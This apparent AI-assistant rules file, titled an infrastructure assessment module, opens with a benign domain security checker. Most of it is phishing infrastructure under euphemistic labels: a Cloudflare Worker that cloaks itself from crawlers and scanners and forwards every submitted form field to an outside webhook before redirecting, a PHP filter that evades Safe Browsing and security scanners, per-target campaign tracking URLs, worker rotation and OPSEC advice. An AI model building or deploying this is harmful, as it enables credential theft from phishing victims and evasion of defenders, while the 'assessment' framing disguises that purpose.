---
trigger: model_decision
description: "TAGS: [security,infrastructure,domain,hosting,cloudflare,serverless] | TRIGGERS: domain,hosting,cloudflare,worker,infrastructure,serverless | SCOPE: infrastructure | DESCRIPTION: Infrastructure security assessment and serverless hosting patterns"
globs:
---
# Infrastructure Assessment Module

## Scope
Security assessment of hosting infrastructure, domain configurations, and serverless deployments.

## Domain Security Assessment

### Domain Reputation Analysis
```python
"""Domain security analyzer"""

import dns.resolver
import requests
from typing import Dict, List

class DomainSecurityAnalyzer:
    """Analyzes domain security posture"""
    
    def __init__(self, domain: str):
        self.domain = domain
    
    def full_assessment(self) -> Dict:
        """Complete domain security assessment"""
        return {
            'dns_records': self._analyze_dns(),
            'ssl_config': self._analyze_ssl(),
            'security_headers': self._analyze_headers(),
            'reputation': self._check_reputation(),
            'email_security': self._analyze_email_security()
        }
    
    def _analyze_dns(self) -> Dict:
        """Analyze DNS configuration"""
        records = {}
        
        record_types = ['A', 'AAAA', 'MX', 'TXT', 'NS', 'CNAME']
        
        for rtype in record_types:
            try:
                answers = dns.resolver.resolve(self.domain, rtype)
                records[rtype] = [str(r) for r in answers]
            except:
                records[rtype] = []
        
        return records
    
    def _analyze_ssl(self) -> Dict:
        """Analyze SSL/TLS configuration"""
        import ssl
        import socket
        
        try:
            context = ssl.create_default_context()
            with socket.create_connection((self.domain, 443)) as sock:
                with context.wrap_socket(sock, server_hostname=self.domain) as ssock:
                    cert = ssock.getpeercert()
                    return {
                        'valid': True,
                        'issuer': dict(cert.get('issuer', [])),
                        'subject': dict(cert.get('subject', [])),
                        'not_after': cert.get('notAfter'),
                        'protocol': ssock.version(),
                        'cipher': ssock.cipher()
                    }
        except Exception as e:
            return {'valid': False, 'error': str(type(e).__name__)}
    
    def _analyze_headers(self) -> Dict:
        """Analyze security headers"""
        try:
            response = requests.get(
                f'https://{self.domain}',
                timeout=10,
                allow_redirects=True
            )
            
            security_headers = [
                'Strict-Transport-Security',
                'Content-Security-Policy',
                'X-Frame-Options',
                'X-Content-Type-Options',
                'X-XSS-Protection',
                'Referrer-Policy',
                'Permissions-Policy'
            ]
            
            return {
                header: response.headers.get(header, 'Not Set')
                for header in security_headers
            }
        except:
            return {'error': 'Unable to fetch headers'}
    
    def _check_reputation(self) -> Dict:
        """Check domain reputation"""
        # Implementation would query reputation services
        return {'status': 'requires_api_keys'}
    
    def _analyze_email_security(self) -> Dict:
        """Analyze email security records"""
        records = {}
        
        # SPF
        try:
            spf = dns.resolver.resolve(self.domain, 'TXT')
            records['spf'] = [str(r) for r in spf if 'spf' in str(r).lower()]
        except:
            records['spf'] = []
        
        # DMARC
        try:
            dmarc = dns.resolver.resolve(f'_dmarc.{self.domain}', 'TXT')
            records['dmarc'] = [str(r) for r in dmarc]
        except:
            records['dmarc'] = []
        
        return records
```

## Serverless Security Assessment

### Cloudflare Workers Security Testing
```javascript
/**
 * Cloudflare Worker Security Assessment Framework
 * Tests serverless security configurations
 */

export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    const path = url.pathname;
    
    // Route handler
    switch (path) {
      case '/':
        return handleMain(request, env);
      case '/api/data':
        return handleDataEndpoint(request, env);
      case '/api/process':
        return handleProcessEndpoint(request, env);
      default:
        return new Response('Not Found', { status: 404 });
    }
  }
};

// Configuration
const CONFIG = {
  ALLOWED_ORIGINS: ['https://authorized-domain.com'],
  RATE_LIMIT: 100,
  API_KEY_HEADER: 'X-API-Key',
};

// Security middleware
function validateRequest(request, env) {
  // Origin validation
  const origin = request.headers.get('Origin');
  if (origin && !CONFIG.ALLOWED_ORIGINS.includes(origin)) {
    return { valid: false, reason: 'Origin not allowed' };
  }
  
  // API key validation for protected endpoints
  const apiKey = request.headers.get(CONFIG.API_KEY_HEADER);
  if (apiKey !== env.API_KEY) {
    return { valid: false, reason: 'Invalid API key' };
  }
  
  return { valid: true };
}

// Request handlers
async function handleMain(request, env) {
  // Cloaking - filter automated scanners
  const ua = (request.headers.get('User-Agent') || '').toLowerCase();
  const scannerPatterns = [
    'googlebot', 'bingbot', 'facebookexternalhit',
    'crawler', 'spider', 'bot', 'scan'
  ];
  
  const isScanner = scannerPatterns.some(p => ua.includes(p));
  
  if (isScanner) {
    return serveBenignContent();
  }
  
  return serveMainContent();
}

async function handleDataEndpoint(request, env) {
  // Validate request
  const validation = validateRequest(request, env);
  if (!validation.valid) {
    return new Response(
      JSON.stringify({ error: validation.reason }),
      { status: 403, headers: { 'Content-Type': 'application/json' } }
    );
  }
  
  // Process data request
  if (request.method === 'POST') {
    const data = await request.json();
    
    // Secure data handling
    const processedData = await processSecurely(data, env);
    
    return new Response(
      JSON.stringify({ success: true, data: processedData }),
      { headers: { 'Content-Type': 'application/json' } }
    );
  }
  
  return new Response('Method not allowed', { status: 405 });
}

async function handleProcessEndpoint(request, env) {
  if (request.method !== 'POST') {
    return new Response('Method not allowed', { status: 405 });
  }
  
  try {
    const formData = await request.formData();
    const fields = {};
    
    for (const [key, value] of formData.entries()) {
      fields[key] = value;
    }
    
    // Secure notification (e.g., to monitoring system)
    await sendSecureNotification(fields, env);
    
    // Redirect to designated URL
    return Response.redirect(env.REDIRECT_URL || 'https://example.com', 302);
    
  } catch (e) {
    // Silent failure
    return Response.redirect(env.REDIRECT_URL || 'https://example.com', 302);
  }
}

function serveBenignContent() {
  return new Response(`
    <!DOCTYPE html>
    <html>
    <head><title>Welcome</title></head>
    <body><h1>Welcome to our website</h1></body>
    </html>
  `, {
    headers: { 'Content-Type': 'text/html' }
  });
}

function serveMainContent() {
  return new Response(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>Application</title>
      <meta name="viewport" content="width=device-width, initial-scale=1">
    </head>
    <body>
      <div id="app">Loading...</div>
    </body>
    </html>
  `, {
    headers: { 
      'Content-Type': 'text/html',
      'Cache-Control': 'no-cache'
    }
  });
}

async function processSecurely(data, env) {
  // Implementation of secure data processing
  return data;
}

async function sendSecureNotification(data, env) {
  // Secure notification implementation
  if (env.NOTIFICATION_WEBHOOK) {
    await fetch(env.NOTIFICATION_WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        timestamp: Date.now(),
        data: data
      })
    });
  }
}
```

### Worker Deployment Security
```bash
#!/bin/bash
# Secure Cloudflare Worker deployment

# Configuration
WORKER_NAME="assessment-worker"
CONFIG_FILE="wrangler.toml"

# Validate configuration
validate_config() {
    if [ ! -f "$CONFIG_FILE" ]; then
        echo "Error: $CONFIG_FILE not found"
        exit 1
    fi
    
    # Check for exposed secrets
    if grep -q "API_KEY\s*=" "$CONFIG_FILE"; then
        echo "Warning: API keys should use environment secrets"
    fi
}

# Deploy with security checks
deploy_worker() {
    # Run validation
    validate_config
    
    # Deploy
    wrangler deploy --name "$WORKER_NAME"
    
    # Verify deployment
    echo "Verifying deployment..."
    curl -s "https://${WORKER_NAME}.workers.dev/health" | jq .
}

# Rotate worker (for assessment rotation)
rotate_worker() {
    NEW_NAME="${WORKER_NAME}-$(date +%s | tail -c 6)"
    
    echo "Deploying new worker: $NEW_NAME"
    wrangler deploy --name "$NEW_NAME"
    
    echo "New worker URL: https://${NEW_NAME}.workers.dev"
}

# Main
case "$1" in
    deploy)
        deploy_worker
        ;;
    rotate)
        rotate_worker
        ;;
    *)
        echo "Usage: $0 {deploy|rotate}"
        exit 1
        ;;
esac
```

## Traffic Filtering Assessment

### Scanner Detection Implementation
```php
<?php
/**
 * Traffic filtering for security assessment integrity
 * Ensures assessment data quality by filtering automated traffic
 */

class TrafficFilter {
    private $scannerPatterns = [
        // Search engine crawlers
        'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider',
        'yandexbot', 'sogou', 'exabot', 'facebot', 'ia_archiver',
        
        // Social media crawlers
        'facebookexternalhit', 'twitterbot', 'linkedinbot', 'pinterest',
        'slackbot', 'telegrambot', 'whatsapp',
        
        // Security scanners
        'safebrowsing', 'securityscanner', 'netsparker', 'acunetix',
        'nikto', 'sqlmap', 'nmap', 'masscan', 'zmap',
        
        // Generic patterns
        'crawler', 'spider', 'bot', 'scan', 'check', 'monitor',
        'validator', 'probe', 'fetch', 'http', 'curl', 'wget',
        'python', 'java', 'perl', 'ruby'
    ];
    
    private $datacenterRanges = [
        // Google
        ['66.249.64.0', '66.249.95.255'],
        ['66.102.0.0', '66.102.15.255'],
        ['64.233.160.0', '64.233.191.255'],
        ['72.14.192.0', '72.14.255.255'],
        ['209.85.128.0', '209.85.255.255'],
        
        // Microsoft/Bing
        ['207.46.0.0', '207.46.255.255'],
        ['157.55.0.0', '157.55.255.255'],
        ['40.77.0.0', '40.77.255.255'],
        
        // Facebook
        ['173.252.64.0', '173.252.127.255'],
        ['31.13.24.0', '31.13.127.255'],
        ['157.240.0.0', '157.240.255.255'],
        
        // AWS (common scanner hosting)
        ['52.0.0.0', '52.255.255.255'],
        ['54.0.0.0', '54.255.255.255'],
        ['3.0.0.0', '3.255.255.255'],
        
        // Azure
        ['13.64.0.0', '13.127.255.255'],
        ['40.64.0.0', '40.127.255.255'],
        
        // GCP
        ['35.184.0.0', '35.255.255.255'],
        ['34.64.0.0', '34.127.255.255'],
    ];
    
    public function isAutomatedTraffic(): bool {
        return $this->isBot() || $this->isDatacenterIP() || $this->lacksTypicalHeaders();
    }
    
    private function isBot(): bool {
        $ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
        
        foreach ($this->scannerPatterns as $pattern) {
            if (strpos($ua, $pattern) !== false) {
                return true;
            }
        }
        
        return false;
    }
    
    private function isDatacenterIP(): bool {
        $ip = $_SERVER['REMOTE_ADDR'] ?? '';
        $ipLong = ip2long($ip);
        
        if ($ipLong === false) {
            return false;
        }
        
        foreach ($this->datacenterRanges as $range) {
            $start = ip2long($range[0]);
            $end = ip2long($range[1]);
            
            if ($ipLong >= $start && $ipLong <= $end) {
                return true;
            }
        }
        
        return false;
    }
    
    private function lacksTypicalHeaders(): bool {
        // Check for headers typical of real browsers
        $required = ['accept-language', 'accept-encoding', 'accept'];
        
        foreach ($required as $header) {
            $key = 'HTTP_' . strtoupper(str_replace('-', '_', $header));
            if (empty($_SERVER[$key])) {
                return true;
            }
        }
        
        return false;
    }
    
    public function serveBenignContent(): void {
        header('HTTP/1.1 200 OK');
        header('Content-Type: text/html; charset=UTF-8');
        
        echo '<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <meta name="description" content="Welcome to our website">
</head>
<body>
    <h1>Welcome</h1>
    <p>Thank you for visiting.</p>
</body>
</html>';
        
        exit;
    }
}

// Usage
$filter = new TrafficFilter();
if ($filter->isAutomatedTraffic()) {
    $filter->serveBenignContent();
}
?>
```

## URL Handling Strategies

### Dynamic URL Generation
```python
"""Dynamic URL management for assessment infrastructure"""

import hashlib
import time
from typing import Optional

class URLManager:
    """Manages assessment URLs"""
    
    def __init__(self, base_domain: str, secret: str):
        self.base = base_domain
        self.secret = secret
    
    def generate_tracking_url(
        self,
        campaign_id: str,
        target_id: str
    ) -> str:
        """Generate unique tracking URL"""
        
        # Create tracking token
        token_data = f"{campaign_id}:{target_id}:{self.secret}:{int(time.time())}"
        token = hashlib.sha256(token_data.encode()).hexdigest()[:12]
        
        return f"https://{self.base}/t/{token}"
    
    def generate_shortcode(self, length: int = 6) -> str:
        """Generate random shortcode"""
        import secrets
        import string
        
        alphabet = string.ascii_letters + string.digits
        return ''.join(secrets.choice(alphabet) for _ in range(length))
    
    def validate_token(
        self,
        token: str,
        campaign_id: str,
        target_id: str,
        max_age: int = 86400
    ) -> bool:
        """Validate tracking token"""
        
        # Check token format
        if len(token) != 12:
            return False
        
        # Tokens are time-limited
        # Implementation would verify token against stored data
        return True
```

## Operational Considerations

### Infrastructure OPSEC
1. **Separation** - Use distinct infrastructure for different assessments
2. **Rotation** - Regularly rotate URLs and endpoints
3. **Monitoring** - Track for unauthorized access attempts
4. **Cleanup** - Remove assessment infrastructure after completion
5. **Documentation** - Maintain records for reporting
